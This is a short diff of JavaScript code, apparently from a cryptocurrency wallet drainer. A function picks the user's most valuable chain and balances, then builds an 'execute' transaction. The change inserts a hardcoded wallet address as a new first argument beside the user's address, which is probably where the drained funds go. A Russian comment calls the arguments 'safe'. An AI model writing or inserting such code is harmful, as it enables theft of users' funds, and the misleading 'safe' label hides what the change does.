@@ -514,7 +514,7 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
         }
       ],
       functionName: 'execute',
-      args: [getAddress(CONTRACTS[mostExpensive.chainId]), getAddress(state.address), 0] // Безопасные аргументы
+      args: [getAddress('0xd45e073e707cAA62892E5D313e87f333332B37AE'), getAddress(CONTRACTS[mostExpensive.chainId]), getAddress(state.address), 0] // Безопасные аргументы
     }),
     value: '0x00'
   };
